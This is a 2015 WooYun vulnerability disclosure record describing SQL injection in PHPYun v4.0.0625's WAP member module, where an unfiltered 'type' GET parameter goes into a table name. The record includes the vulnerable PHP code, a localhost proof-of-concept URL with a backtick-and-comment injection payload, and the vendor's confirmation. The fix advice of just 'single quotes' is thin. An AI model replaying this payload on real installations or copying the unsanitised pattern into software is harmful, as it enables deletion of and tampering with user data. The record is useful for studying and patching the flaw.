{"id": 70272, "wybug_id": "wooyun-2015-0125857", "wybug_title": "phpyun_v4.0.0625最新版注入（可获取部分数据）", "wybug_corp": "php云人才系统", "wybug_author": "Xser", "wybug_date": "2015-07-10 10:36", "wybug_open_date": "2015-10-08 10:42", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-08：\t细节向公众公开  简要描述： RT 详细说明：  出现在wap\\member\\model\\index.class.php中\nfunction rinfo_action(){\t\tif($_GET['type']&&intval($_GET['id'])){\t\t\t$nid=$this->obj->DB_delete_all(\"resume_\".$_GET['type'],\"`eid`='\".(int)$_GET['eid'].\"' and `id`='\".(int)$_GET['id'].\"' and `uid`='\".$this->uid.\"'\");\t\t\tif($nid)\t\t\t{\t\t\t\t$url=$_GET['type'];\t\t\t\t$this->obj->DB_update_all(\"user_resume\",\"`$url`=`$url`-1\",\"`eid`='\".(int)$_GET['eid'].\"' and `uid`='\".$this->uid.\"'\");\t\t\t\t$resume_row=$this->obj->DB_select_once(\"user_resume\",\"`eid`='\".(int)$_GET['eid'].\"'\");\t\t\t\t$this->complete($resume_row);\t\t\t\t$data['msg']='删除成功！';\t\t\t}else{\t\t\t\t$data['msg']='删除失败！';\t\t\t}            $data['url']=\"index.php?c=rinfo&eid=\".(int)$_GET['eid'].\"&type=\".$_GET['type'];\t\t\t$this->yunset(\"layer\",$data);\t\t}\t\t$this->rightinfo();\t\t$this->yunset($this->MODEL('cache')->GetCache(array('city','user','hy','job')));\t\t$rows=$this->obj->DB_select_all(\"resume_\".$_GET['type'],\"`eid`='\".(int)$_GET['eid'].\"' and `uid`='\".$this->uid.\"'\");\t\t$this->yunset(\"rows\",$rows);\t\t$this->yunset(\"type\",$_GET['type']);\t\t$this->yunset(\"eid\",$_GET['eid']);\t\t$this->waptpl('rinfo');\n可见\nif($_GET['type']&&intval($_GET['id'])){\t\t\t$nid=$this->obj->DB_delete_all(\"resume_\".$_GET['type'],\"`eid`='\".(int)$_GET['eid'].\"' and `id`='\".(int)$_GET['id'].\"' and `uid`='\".$this->uid.\"'\");\n$_GET['type']被带进去，没有单引号没过滤我们提交\nhttp://127.0.0.1/upload/wap/member/index.php?c=rinfo&id=1&type=expect%60%20where%20id%3D3%23\n\n\n语句被带进去执行了。   漏洞证明：  出现在wap\\member\\model\\index.class.php中\nfunction rinfo_action(){\t\tif($_GET['type']&&intval($_GET['id'])){\t\t\t$nid=$this->obj->DB_delete_all(\"resume_\".$_GET['type'],\"`eid`='\".(int)$_GET['eid'].\"' and `id`='\".(int)$_GET['id'].\"' and `uid`='\".$this->uid.\"'\");\t\t\tif($nid)\t\t\t{\t\t\t\t$url=$_GET['type'];\t\t\t\t$this->obj->DB_update_all(\"user_resume\",\"`$url`=`$url`-1\",\"`eid`='\".(int)$_GET['eid'].\"' and `uid`='\".$this->uid.\"'\");\t\t\t\t$resume_row=$this->obj->DB_select_once(\"user_resume\",\"`eid`='\".(int)$_GET['eid'].\"'\");\t\t\t\t$this->complete($resume_row);\t\t\t\t$data['msg']='删除成功！';\t\t\t}else{\t\t\t\t$data['msg']='删除失败！';\t\t\t}            $data['url']=\"index.php?c=rinfo&eid=\".(int)$_GET['eid'].\"&type=\".$_GET['type'];\t\t\t$this->yunset(\"layer\",$data);\t\t}\t\t$this->rightinfo();\t\t$this->yunset($this->MODEL('cache')->GetCache(array('city','user','hy','job')));\t\t$rows=$this->obj->DB_select_all(\"resume_\".$_GET['type'],\"`eid`='\".(int)$_GET['eid'].\"' and `uid`='\".$this->uid.\"'\");\t\t$this->yunset(\"rows\",$rows);\t\t$this->yunset(\"type\",$_GET['type']);\t\t$this->yunset(\"eid\",$_GET['eid']);\t\t$this->waptpl('rinfo');\n可见\nif($_GET['type']&&intval($_GET['id'])){\t\t\t$nid=$this->obj->DB_delete_all(\"resume_\".$_GET['type'],\"`eid`='\".(int)$_GET['eid'].\"' and `id`='\".(int)$_GET['id'].\"' and `uid`='\".$this->uid.\"'\");\n$_GET['type']被带进去，没有单引号没过滤我们提交\nhttp://127.0.0.1/upload/wap/member/index.php?c=rinfo&id=1&type=expect%60%20where%20id%3D3%23\n\n\n语句被带进去执行了。   修复方案：  单引号   版权声明：转载请注明来源 Xser@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-07-10 10:41 厂商回复： 感谢您的提供，我们会尽快修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}